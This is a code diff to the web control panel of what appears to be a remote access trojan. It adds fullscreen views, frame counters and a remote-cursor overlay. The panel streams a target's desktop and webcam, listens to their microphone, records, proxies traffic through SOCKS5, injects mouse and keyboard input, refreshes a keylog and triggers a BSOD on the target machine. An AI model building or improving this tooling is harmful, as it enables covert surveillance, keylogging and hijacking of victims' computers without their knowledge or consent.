@@ -319,6 +319,24 @@
             align-items: center;
             gap: 0.4rem;
         }
+        .stream-header .fullscreen-btn {
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            cursor: pointer;
+            padding: 0.25rem 0.5rem;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+        }
+        .stream-header .fullscreen-btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            background: var(--accent-glow);
+        }
         .stream-live-badge {
             background: var(--danger);
             color: white;
@@ -336,13 +354,14 @@
         }
         .stream-canvas {
             width: 100%;
-            height: 280px;
+            height: calc(40vh - 40px);
             display: block;
             background: #0a0a0a;
+            object-fit: contain;
         }
         .stream-placeholder {
             width: 100%;
-            height: 280px;
+            height: calc(40vh - 40px);
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -354,19 +373,99 @@
         .stream-placeholder .icon { font-size: 2.5rem; opacity: 0.3; }
         .stream-placeholder .text { font-size: 0.8rem; }
 
+        /* ===== FULLSCREEN OVERLAY ===== */
+        .fullscreen-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            z-index: 99999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .fullscreen-overlay.active {
+            display: flex;
+        }
+        .fullscreen-overlay canvas {
+            max-width: 100vw;
+            max-height: calc(100vh - 50px);
+            width: auto;
+            height: auto;
+            object-fit: contain;
+            display: block;
+            background: #000;
+        }
+        .fullscreen-overlay .fs-toolbar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            padding: 0.6rem 1.5rem;
+            background: rgba(13, 17, 23, 0.85);
+            backdrop-filter: blur(12px);
+            border-top: 1px solid rgba(255,255,255,0.08);
+            z-index: 100000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .fullscreen-overlay:hover .fs-toolbar,
+        .fullscreen-overlay .fs-toolbar:focus-within {
+            opacity: 1;
+        }
+        .fullscreen-overlay .fs-toolbar .action-btn {
+            font-size: 0.75rem;
+            padding: 0.5rem 1rem;
+        }
+        .fullscreen-overlay .fs-label {
+            position: absolute;
+            top: 0.8rem;
+            left: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            z-index: 100000;
+        }
+        .fullscreen-overlay:hover .fs-label {
+            opacity: 1;
+        }
+        .fullscreen-overlay .fs-label .stream-live-badge {
+            display: inline-block;
+        }
+
         /* Action Buttons */
         .action-bar {
             display: flex;
-            gap: 0.6rem;
+            gap: 0.5rem;
             flex-wrap: wrap;
+            padding: 0.8rem 0;
+        }
+        .action-bar .action-group {
+            display: flex;
+            gap: 0.4rem;
+            padding-right: 0.8rem;
+            border-right: 1px solid var(--border);
+        }
+        .action-bar .action-group:last-child {
+            border-right: none;
+            padding-right: 0;
         }
         .action-btn {
-            padding: 0.65rem 1.2rem;
+            padding: 0.6rem 1rem;
             border: 1px solid var(--border);
             border-radius: 10px;
             cursor: pointer;
             font-weight: 600;
-            font-size: 0.8rem;
+            font-size: 0.78rem;
             font-family: 'Inter', sans-serif;
             transition: var(--transition);
             display: flex;
@@ -374,6 +473,7 @@
             gap: 0.4rem;
             background: var(--bg-tertiary);
             color: var(--text-primary);
+            white-space: nowrap;
         }
         .action-btn:hover {
             border-color: var(--accent);
@@ -605,6 +705,108 @@
             .sidebar { display: none; }
             .stream-grid { grid-template-columns: 1fr; }
         }
+
+        /* Large monitors: make streams even bigger */
+        @media (min-height: 900px) {
+            .stream-canvas,
+            .stream-placeholder {
+                height: calc(50vh - 60px);
+            }
+        }
+
+        /* ===== FPS COUNTER ===== */
+        .fps-counter {
+            position: absolute;
+            top: 42px;
+            right: 8px;
+            background: rgba(0,0,0,0.75);
+            backdrop-filter: blur(6px);
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.65rem;
+            font-weight: 600;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            z-index: 5;
+            pointer-events: none;
+            display: none;
+            border: 1px solid rgba(0,255,136,0.2);
+        }
+        .fps-counter.visible { display: block; }
+
+        /* ===== STREAM INFO BAR ===== */
+        .stream-info {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(6px);
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 0.3rem 0.8rem;
+            font-size: 0.6rem;
+            font-family: 'JetBrains Mono', monospace;
+            color: var(--text-muted);
+            z-index: 5;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .stream-box:hover .stream-info { opacity: 1; }
+        .stream-info span { display: flex; align-items: center; gap: 0.3rem; }
+        .stream-info .val { color: var(--accent); }
+
+        /* ===== CONTROL BADGE ===== */
+        .control-badge {
+            background: rgba(255, 165, 2, 0.2);
+            color: #ffa502;
+            padding: 0.15rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.6rem;
+            font-weight: 700;
+            border: 1px solid rgba(255, 165, 2, 0.4);
+            display: none;
+            animation: blink 1.5s ease-in-out infinite;
+        }
+        .control-badge.visible { display: inline-block; }
+
+        /* ===== REMOTE CURSOR OVERLAY ===== */
+        .cursor-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 4;
+        }
+
+        /* ===== CLICK RIPPLE ===== */
+        .click-ripple {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            border: 2px solid var(--accent);
+            pointer-events: none;
+            z-index: 6;
+            animation: ripple-out 0.5s ease-out forwards;
+            transform: translate(-50%, -50%);
+        }
+        @keyframes ripple-out {
+            0% { width: 6px; height: 6px; opacity: 1; }
+            100% { width: 40px; height: 40px; opacity: 0; }
+        }
+
+        /* ===== IMPROVED BUTTON TOGGLE STATES ===== */
+        .action-btn.streaming {
+            background: rgba(0, 255, 136, 0.15);
+            border-color: var(--accent);
+            color: var(--accent);
+            box-shadow: 0 0 12px rgba(0, 255, 136, 0.1);
+        }
     </style>
 </head>
 <body>
@@ -693,44 +895,73 @@
             <!-- LIVE VIEW -->
             <div id="live" class="tab-content active">
                 <div class="stream-grid">
-                    <div class="stream-box">
+                    <div class="stream-box" id="screen-box">
                         <div class="stream-header">
                             <h4>🖥️ Desktop Stream</h4>
-                            <span class="stream-live-badge" id="screen-live-badge">● LIVE</span>
+                            <div style="display: flex; align-items: center; gap: 0.5rem;">
+                                <span class="control-badge" id="screen-control-badge">🎮 CONTROL</span>
+                                <span class="stream-live-badge" id="screen-live-badge">● LIVE</span>
+                                <button class="fullscreen-btn" onclick="openFullscreen('screen')" title="Fullscreen">⛶ Expand</button>
+                            </div>
                         </div>
                         <div id="screen-placeholder" class="stream-placeholder">
                             <div class="icon">🖥️</div>
                             <div class="text">Desktop stream inactive</div>
                         </div>
-                        <canvas id="screen-canvas" class="stream-canvas" style="display:none;"></canvas>
+                        <canvas id="screen-canvas" class="stream-canvas" style="display:none;" tabindex="0"></canvas>
+                        <canvas id="screen-cursor-overlay" class="cursor-overlay" style="display:none;"></canvas>
+                        <div class="fps-counter" id="screen-fps">0 FPS</div>
+                        <div class="stream-info" id="screen-info">
+                            <span>RES: <b class="val" id="screen-res">-</b></span>
+                            <span>FPS: <b class="val" id="screen-fps-val">0</b></span>
+                            <span>FRAMES: <b class="val" id="screen-frames">0</b></span>
+                        </div>
                     </div>
-                    <div class="stream-box">
+                    <div class="stream-box" id="webcam-box">
                         <div class="stream-header">
                             <h4>📷 Webcam Stream</h4>
-                            <span class="stream-live-badge" id="webcam-live-badge">● LIVE</span>
+                            <div style="display: flex; align-items: center; gap: 0.5rem;">
+                                <span class="stream-live-badge" id="webcam-live-badge">● LIVE</span>
+                                <button class="fullscreen-btn" onclick="openFullscreen('webcam')" title="Fullscreen">⛶ Expand</button>
+                            </div>
                         </div>
                         <div id="webcam-placeholder" class="stream-placeholder">
                             <div class="icon">📷</div>
                             <div class="text">Webcam stream inactive</div>
                         </div>
-                        <canvas id="webcam-canvas" class="stream-canvas" style="display:none;"></canvas>
+                        <canvas id="webcam-canvas" class="stream-canvas" style="display:none;" tabindex="0"></canvas>
+                        <div class="fps-counter" id="webcam-fps">0 FPS</div>
+                        <div class="stream-info" id="webcam-info">
+                            <span>RES: <b class="val" id="webcam-res">-</b></span>
+                            <span>FPS: <b class="val" id="webcam-fps-val">0</b></span>
+                            <span>FRAMES: <b class="val" id="webcam-frames">0</b></span>
+                        </div>
                     </div>
                 </div>
                 <div class="action-bar">
-                    <button class="action-btn" id="btn-screen" onclick="toggleStream('screen')">🖥️ Toggle Desktop</button>
-                    <button class="action-btn" id="btn-webcam" onclick="toggleStream('webcam')">📷 Toggle Webcam</button>
-                    <button class="action-btn" id="btn-control" onclick="toggleControl()">🎮 Enable Control</button>
-                    <button class="action-btn" id="btn-fullscreen" onclick="toggleFullscreen()">🔲 Fullscreen</button>
-                    <button class="action-btn" id="btn-audio" onclick="toggleStream('audio')">🎤 Listen Audio</button>
-                    <button class="action-btn" id="btn-record" onclick="toggleStream('record')" style="background: rgba(255, 71, 87, 0.2); border-color: #ff4757;">🔴 Start Recording</button>
-                    <button class="action-btn" id="btn-socks" onclick="toggleStream('socks5')">🔗 Toggle SOCKS5</button>
-                    <button class="action-btn" onclick="takeScreenshot()">📸 Screenshot</button>
-                    <button class="action-btn" style="border-color: var(--accent); color: var(--accent); font-weight: 700;" onclick="getDetailedInfo()">🕵️ PC Info</button>
+                    <div class="action-group">
+                        <button class="action-btn" id="btn-screen" onclick="toggleStream('screen')">🖥️ Desktop</button>
+                        <button class="action-btn" id="btn-webcam" onclick="toggleStream('webcam')">📷 Webcam</button>
+                    </div>
+                    <div class="action-group">
+                        <button class="action-btn" id="btn-control" onclick="toggleControl()">🎮 Control</button>
+                        <button class="action-btn" id="btn-fullscreen-screen" onclick="openFullscreen('screen')">🖥️ Fullscreen Screen</button>
+                        <button class="action-btn" id="btn-fullscreen-webcam" onclick="openFullscreen('webcam')">📷 Fullscreen Webcam</button>
+                    </div>
+                    <div class="action-group">
+                        <button class="action-btn" id="btn-audio" onclick="toggleStream('audio')">🎤 Audio</button>
+                        <button class="action-btn" id="btn-record" onclick="toggleStream('record')" style="background: rgba(255, 71, 87, 0.2); border-color: #ff4757;">🔴 Record</button>
+                        <button class="action-btn" id="btn-socks" onclick="toggleStream('socks5')">🔗 SOCKS5</button>
+                    </div>
+                    <div class="action-group">
+                        <button class="action-btn" onclick="takeScreenshot()">📸 Screenshot</button>
+                        <button class="action-btn" style="border-color: var(--accent); color: var(--accent); font-weight: 700;" onclick="getDetailedInfo()">🕵️ PC Info</button>
+                    </div>
                 </div>
                 <!-- Quality Selector -->
-                <div style="margin-top: 1rem; display: flex; gap: 1rem; align-items: center; font-size: 0.75rem; color: var(--text-muted);">
+                <div style="display: flex; gap: 1rem; align-items: center; font-size: 0.75rem; color: var(--text-muted);">
                     <span>Stream Quality:</span>
-                    <select id="stream-quality" class="action-btn" style="padding: 0.2rem 0.5rem; background: var(--bg-card);">
+                    <select id="stream-quality" class="action-btn" style="padding: 0.3rem 0.6rem; background: var(--bg-card);">
                         <option value="0.5,20">Low (Fastest)</option>
                         <option value="0.7,30" selected>Medium (Standard)</option>
                         <option value="1.0,60">High (Detailed)</option>
@@ -985,6 +1216,23 @@
         </div>
     </div>
 
+    <!-- FULLSCREEN OVERLAY -->
+    <div class="fullscreen-overlay" id="fullscreen-overlay">
+        <div class="fs-label">
+            <span class="stream-live-badge visible" id="fs-live-badge">● LIVE</span>
+            <span id="fs-title" style="color: var(--text-primary); font-size: 0.85rem; font-weight: 600;">Desktop Stream</span>
+        </div>
+        <canvas id="fs-canvas"></canvas>
+        <div class="fs-toolbar">
+            <button class="action-btn" onclick="closeFullscreen()">✕ Exit Fullscreen</button>
+            <button class="action-btn" id="fs-btn-control" onclick="toggleControl()">🎮 Control</button>
+            <button class="action-btn" onclick="toggleStream('screen')">🖥️ Desktop</button>
+            <button class="action-btn" onclick="toggleStream('webcam')">📷 Webcam</button>
+            <button class="action-btn" onclick="takeScreenshot()">📸 Screenshot</button>
+            <span style="color: var(--text-muted); font-size: 0.7rem; margin-left: auto;">Press ESC to exit</span>
+        </div>
+    </div>
+
     <!-- PC INFO MODAL -->
     <div id="sysinfo-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
         <div class="terminal-container" style="width: 500px; max-width: 95%;">
@@ -1007,6 +1255,101 @@
         let isControlEnabled = false;
         let map, markers = {};
         let cpuChart, ramChart, netChart;
+
+        /* ===== FPS TRACKING ===== */
+        const fpsData = {
+            screen: { count: 0, fps: 0, totalFrames: 0, lastTime: performance.now() },
+            webcam: { count: 0, fps: 0, totalFrames: 0, lastTime: performance.now() }
+        };
+
+        function updateFpsCounters() {
+            const now = performance.now();
+            ['screen', 'webcam'].forEach(type => {
+                const d = fpsData[type];
+                const elapsed = now - d.lastTime;
+                if (elapsed >= 1000) {
+                    d.fps = Math.round((d.count * 1000) / elapsed);
+                    d.count = 0;
+                    d.lastTime = now;
+
+                    const fpsEl = document.getElementById(type + '-fps');
+                    const fpsValEl = document.getElementById(type + '-fps-val');
+                    if (fpsEl) {
+                        fpsEl.textContent = d.fps + ' FPS';
+                        fpsEl.style.color = d.fps > 20 ? '#00ff88' : d.fps > 10 ? '#ffa502' : '#ff4757';
+                    }
+                    if (fpsValEl) fpsValEl.textContent = d.fps;
+
+                    const framesEl = document.getElementById(type + '-frames');
+                    if (framesEl) framesEl.textContent = d.totalFrames;
+                }
+            });
+            requestAnimationFrame(updateFpsCounters);
+        }
+        requestAnimationFrame(updateFpsCounters);
+
+        /* ===== CURSOR OVERLAY ===== */
+        let lastCursorPos = { x: 0.5, y: 0.5 };
+
+        function drawCursorOverlay(canvas, x, y) {
+            const overlay = document.getElementById('screen-cursor-overlay');
+            if (!overlay || !isControlEnabled) return;
+            const box = canvas.parentElement;
+            if (!box) return;
+
+            overlay.width = canvas.clientWidth;
+            overlay.height = canvas.clientHeight;
+            overlay.style.display = 'block';
+            overlay.style.top = canvas.offsetTop + 'px';
+            overlay.style.left = canvas.offsetLeft + 'px';
+            overlay.style.width = canvas.clientWidth + 'px';
+            overlay.style.height = canvas.clientHeight + 'px';
+
+            const ctx = overlay.getContext('2d');
+            ctx.clearRect(0, 0, overlay.width, overlay.height);
+
+            const px = x * overlay.width;
+            const py = y * overlay.height;
+
+            // Crosshair
+            ctx.strokeStyle = '#00ff88';
+            ctx.lineWidth = 1.5;
+            ctx.globalAlpha = 0.8;
+
+            // Horizontal
+            ctx.beginPath();
+            ctx.moveTo(px - 12, py);
+            ctx.lineTo(px - 4, py);
+            ctx.moveTo(px + 4, py);
+            ctx.lineTo(px + 12, py);
+            ctx.stroke();
+
+            // Vertical
+            ctx.beginPath();
+            ctx.moveTo(px, py - 12);
+            ctx.lineTo(px, py - 4);
+            ctx.moveTo(px, py + 4);
+            ctx.lineTo(px, py + 12);
+            ctx.stroke();
+
+            // Center dot
+            ctx.fillStyle = '#00ff88';
+            ctx.globalAlpha = 1;
+            ctx.beginPath();
+            ctx.arc(px, py, 2, 0, Math.PI * 2);
+            ctx.fill();
+        }
+
+        function spawnClickRipple(canvas, e) {
+            const rect = canvas.getBoundingClientRect();
+            const box = canvas.closest('.stream-box') || canvas.parentElement;
+            const ripple = document.createElement('div');
+            ripple.className = 'click-ripple';
+            ripple.style.left = (e.clientX - rect.left) + 'px';
+            ripple.style.top = (e.clientY - rect.top + canvas.offsetTop) + 'px';
+            box.appendChild(ripple);
+            setTimeout(() => ripple.remove(), 500);
+        }
 
         /* ===== INITIALIZATION ===== */
         window.onload = () => {
@@ -1221,15 +1564,17 @@
 
         // Audio Streaming logic
         let audioCtx, nextAudioTime = 0;
-        socket.on('audio_data', (data) => {
+        socket.on('audio_frame', (data) => {
             if (selectedClient && data.client_id === selectedClient) {
-                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const binaryData = atob(data.data);
-                const bytes = new Uint8Array(binaryData.length);
-                for (let i = 0; i < binaryData.length; i++) bytes[i] = binaryData.charCodeAt(i);
+                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: data.fs || 16000 });
                 
+                // Decode base64 to Float32Array
+                const binary = atob(data.data);
+                const bytes = new Uint8Array(binary.length);
+                for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
                 const f32 = new Float32Array(bytes.buffer);
-                const audioBuffer = audioCtx.createBuffer(1, f32.length, 44100);
+
+                const audioBuffer = audioCtx.createBuffer(1, f32.length, data.fs || 16000);
                 audioBuffer.getChannelData(0).set(f32);
                 
                 const source = audioCtx.createBufferSource();
@@ -1383,12 +1728,28 @@
                 document.getElementById('screen-canvas').style.display = active ? 'block' : 'none';
                 document.getElementById('screen-placeholder').style.display = active ? 'none' : 'flex';
                 document.getElementById('screen-live-badge').classList.toggle('visible', active);
+                document.getElementById('screen-fps').classList.toggle('visible', active);
+                const overlay = document.getElementById('screen-cursor-overlay');
+                if (overlay) overlay.style.display = active && isControlEnabled ? 'block' : 'none';
+                const btn = document.getElementById('btn-screen');
+                if (btn) { btn.classList.toggle('streaming', active); btn.innerHTML = active ? '🖥️ Desktop ●' : '🖥️ Desktop'; }
             } else if (type === 'webcam') {
                 webcamActive = !webcamActive; active = webcamActive;
                 document.getElementById('webcam-canvas').style.display = active ? 'block' : 'none';
                 document.getElementById('webcam-placeholder').style.display = active ? 'none' : 'flex';
                 document.getElementById('webcam-live-badge').classList.toggle('visible', active);
+                document.getElementById('webcam-fps').classList.toggle('visible', active);
+                const btn = document.getElementById('btn-webcam');
+                if (btn) { btn.classList.toggle('streaming', active); btn.innerHTML = active ? '📷 Webcam ●' : '📷 Webcam'; }
             }
+
+            // Reset FPS data when turning off
+            if (!active && fpsData[type]) {
+                fpsData[type].count = 0;
+                fpsData[type].fps = 0;
+                fpsData[type].totalFrames = 0;
+            }
+
             socket.emit('toggle_stream', { 
                 client_id: selectedClient, 
                 stream_type: type, 
@@ -1396,14 +1757,40 @@
                 quality: parseInt(quality),
                 resize: parseFloat(resize)
             });
-            showToast(`${type} stream ${active?'ON':'OFF'}`, 'info');
+            showToast(`${type} stream ${active?'ON':'OFF'}`, active ? 'success' : 'info');
         }
 
         function renderFrame(canvasId, b64) {
             const canvas = document.getElementById(canvasId);
             if (!canvas) return;
             const ctx = canvas.getContext('2d'), img = new Image();
-            img.onload = () => { canvas.width = img.width; canvas.height = img.height; ctx.drawImage(img, 0, 0); };
+            img.onload = () => {
+                canvas.width = img.width;
+                canvas.height = img.height;
+                ctx.drawImage(img, 0, 0);
+
+                // Track FPS
+                const type = canvasId.replace('-canvas', '');
+                if (fpsData[type]) {
+                    fpsData[type].count++;
+                    fpsData[type].totalFrames++;
+                }
+
+                // Update resolution display
+                const resEl = document.getElementById(type + '-res');
+                if (resEl) resEl.textContent = img.width + 'x' + img.height;
+
+                // Also render to fullscreen canvas if it's the active stream
+                if (fsActive && fsStreamType === type) {
+                    const fsCanvas = document.getElementById('fs-canvas');
+                    if (fsCanvas) {
+                        fsCanvas.width = img.width;
+                        fsCanvas.height = img.height;
+                        const fsCtx = fsCanvas.getContext('2d');
+                        fsCtx.drawImage(img, 0, 0);
+                    }
+                }
+            };
             img.src = 'data:image/jpeg;base64,' + b64;
         }
 
@@ -1446,88 +1833,115 @@
             if (!requireClient()) return;
             isControlEnabled = !isControlEnabled;
             const btn = document.getElementById('btn-control');
+            const fsBtn = document.getElementById('fs-btn-control');
             if (btn) {
                 btn.classList.toggle('active', isControlEnabled);
-                btn.innerHTML = isControlEnabled ? '🎮 Disable Control' : '🎮 Enable Control';
+                btn.innerHTML = isControlEnabled ? '🎮 Disable Control' : '🎮 Control';
             }
+            if (fsBtn) {
+                fsBtn.classList.toggle('active', isControlEnabled);
+                fsBtn.innerHTML = isControlEnabled ? '🎮 Disable Control' : '🎮 Control';
+            }
+
+            // Control badge
+            const badge = document.getElementById('screen-control-badge');
+            if (badge) badge.classList.toggle('visible', isControlEnabled);
+
+            // Cursor overlay
+            const overlay = document.getElementById('screen-cursor-overlay');
+            if (overlay) overlay.style.display = isControlEnabled && screenActive ? 'block' : 'none';
+
             showToast(`Remote control ${isControlEnabled ? 'ENABLED' : 'DISABLED'}`, isControlEnabled ? 'success' : 'info');
             
-            if (screenCanvas) {
-                screenCanvas.style.cursor = isControlEnabled ? 'crosshair' : 'default';
-                if (isControlEnabled) {
-                    showToast('Click the screen to LOCK mouse (FPS style)', 'info');
-                }
+            // Apply crosshair cursor to both canvases
+            [screenCanvas, document.getElementById('fs-canvas')].forEach(c => {
+                if (c) c.style.cursor = isControlEnabled ? 'crosshair' : 'default';
+            });
+            if (isControlEnabled) {
+                showToast('Click the screen to LOCK mouse (FPS style)', 'info');
             }
         }
 
         // Pointer Lock Implementation
-        if (screenCanvas) {
-            screenCanvas.addEventListener('click', (e) => {
+        function setupCanvasControls(canvas) {
+            if (!canvas) return;
+            canvas.addEventListener('click', (e) => {
                 if (isControlEnabled) {
                     if (!isPointerLocked) {
-                        screenCanvas.requestPointerLock();
-                        screenCanvas.focus();
+                        canvas.requestPointerLock();
+                        canvas.focus();
                     }
                     e.preventDefault();
                     e.stopPropagation();
                 }
             });
 
-            document.addEventListener('pointerlockchange', () => {
-                isPointerLocked = document.pointerLockElement === screenCanvas;
-                if (isPointerLocked) {
-                    showToast('Mouse LOCKED. Press ESC to release.', 'success');
-                }
+            let moveThrottle = false;
+            canvas.addEventListener('mousemove', (e) => {
+                if (!isControlEnabled || !selectedClient || moveThrottle) return;
+                moveThrottle = true;
+                requestAnimationFrame(() => {
+                    if (isPointerLocked) {
+                        socket.emit('mouse_move_relative', { 
+                            client_id: selectedClient, 
+                            dx: e.movementX, 
+                            dy: e.movementY 
+                        });
+                    } else {
+                        const rect = canvas.getBoundingClientRect();
+                        const x = (e.clientX - rect.left) / rect.width;
+                        const y = (e.clientY - rect.top) / rect.height;
+                        lastCursorPos = { x, y };
+                        drawCursorOverlay(canvas, x, y);
+                        socket.emit('mouse_move', { client_id: selectedClient, x: x, y: y });
+                    }
+                    moveThrottle = false;
+                });
             });
 
-            screenCanvas.addEventListener('mousemove', (e) => {
-                if (!isControlEnabled || !selectedClient) return;
-                
-                if (isPointerLocked) {
-                    // Send relative movement
-                    socket.emit('mouse_move_relative', { 
-                        client_id: selectedClient, 
-                        dx: e.movementX, 
-                        dy: e.movementY 
-                    });
-                } else {
-                    // Send absolute movement (scaled)
-                    const rect = screenCanvas.getBoundingClientRect();
-                    const x = (e.clientX - rect.left) / rect.width;
-                    const y = (e.clientY - rect.top) / rect.height;
-                    socket.emit('mouse_move', { client_id: selectedClient, x: x, y: y });
-                }
-            });
-
-            screenCanvas.addEventListener('mousedown', (e) => {
+            canvas.addEventListener('mousedown', (e) => {
                 if (!isControlEnabled || !selectedClient) return;
                 const buttons = ['left', 'middle', 'right'];
                 socket.emit('mouse_click', { client_id: selectedClient, btn: buttons[e.button], action: 'down' });
+                spawnClickRipple(canvas, e);
             });
 
-            screenCanvas.addEventListener('mouseup', (e) => {
+            canvas.addEventListener('mouseup', (e) => {
                 if (!isControlEnabled || !selectedClient) return;
                 const buttons = ['left', 'middle', 'right'];
                 socket.emit('mouse_click', { client_id: selectedClient, btn: buttons[e.button], action: 'up' });
             });
 
-            screenCanvas.addEventListener('contextmenu', (e) => {
+            canvas.addEventListener('contextmenu', (e) => {
                 if (isControlEnabled) e.preventDefault();
             });
 
-            screenCanvas.addEventListener('wheel', (e) => {
+            canvas.addEventListener('wheel', (e) => {
                 if (!isControlEnabled || !selectedClient) return;
                 socket.emit('scroll', { client_id: selectedClient, delta: e.deltaY * -1 });
                 e.preventDefault();
             }, { passive: false });
         }
 
+        // Setup controls on screen canvas
+        setupCanvasControls(screenCanvas);
+
+        // Setup controls on fullscreen canvas (deferred since it exists in DOM already)
+        setupCanvasControls(document.getElementById('fs-canvas'));
+
+        // Pointer Lock change listener (works for any canvas)
+        document.addEventListener('pointerlockchange', () => {
+            isPointerLocked = !!document.pointerLockElement;
+            if (isPointerLocked) {
+                showToast('Mouse LOCKED. Press ESC to release.', 'success');
+            }
+        });
+
         window.addEventListener('keydown', (e) => {
-            if (!isControlEnabled || !selectedClient) return;
-            if (['F5', 'F12', 'F11'].includes(e.key)) return;
-            socket.emit('key_press', { client_id: selectedClient, key: e.key.toLowerCase(), action: 'down' });
-            if (e.target === document.body || e.target === screenCanvas) {
-                e.preventDefault();
+            if (isControlEnabled && selectedClient) {
+                // Prevent browser keys
+                if (['Tab', 'Alt', 'F1', 'F3', 'F5', 'F6', 'F11', 'F12', 'Backspace'].includes(e.key)) e.preventDefault();
+                socket.emit('key_press', { client_id: selectedClient, key: e.key, code: e.code, action: 'down' });
             }
         });
 
@@ -1547,17 +1961,76 @@
             out.scrollTop = out.scrollHeight;
         }
 
+        function takeScreenshot() {
+            if (!requireClient()) return;
+            socket.emit('toggle_stream', { client_id: selectedClient, stream_type: 'screenshot' });
+            showToast('Screenshot requested...', 'info');
+        }
+
+        function flushKeys() {
+            if (!requireClient()) return;
+            socket.emit('flush_keys', { client_id: selectedClient });
+            showToast('Keylog refresh requested', 'info');
+        }
+
         function logout() { window.location.href = '/logout'; }
 
-        function toggleFullscreen() {
-            const el = document.querySelector('.live-view');
-            if (!el) return;
+        /* ===== FULLSCREEN OVERLAY LOGIC ===== */
+        let fsActive = false;
+        let fsStreamType = null;
+
+        function openFullscreen(streamType) {
+            const overlay = document.getElementById('fullscreen-overlay');
+            if (!overlay) return;
+
+            fsStreamType = streamType;
+            fsActive = true;
+            overlay.classList.add('active');
+
+            // Update label
+            const title = document.getElementById('fs-title');
+            if (title) title.textContent = streamType === 'screen' ? '🖥️ Desktop Stream' : '📷 Webcam Stream';
+
+            // Copy the current frame into the fullscreen canvas
+            const srcCanvas = document.getElementById(streamType + '-canvas');
+            const fsCanvas = document.getElementById('fs-canvas');
+            if (srcCanvas && fsCanvas) {
+                fsCanvas.width = srcCanvas.width;
+                fsCanvas.height = srcCanvas.height;
+                const ctx = fsCanvas.getContext('2d');
+                ctx.drawImage(srcCanvas, 0, 0);
+            }
+
+            // Request real browser fullscreen on the overlay
+            if (overlay.requestFullscreen) {
+                overlay.requestFullscreen().catch(() => {});
+            }
+
+            showToast(`Fullscreen: ${streamType}. Press ESC to exit.`, 'info');
+        }
+
+        function closeFullscreen() {
+            fsActive = false;
+            fsStreamType = null;
+            const overlay = document.getElementById('fullscreen-overlay');
+            if (overlay) overlay.classList.remove('active');
             if (document.fullscreenElement) {
-                document.exitFullscreen();
-            } else {
-                el.requestFullscreen();
+                document.exitFullscreen().catch(() => {});
             }
         }
+
+        // Listen for ESC / fullscreen exit
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement && fsActive) {
+                closeFullscreen();
+            }
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && fsActive) {
+                closeFullscreen();
+            }
+        });
         function triggerBsod(mode) {
             if (requireClient() && confirm(`Trigger ${mode} BSOD on target?`)) {
                 socket.emit('trigger_bsod', { client_id: selectedClient, mode: mode });
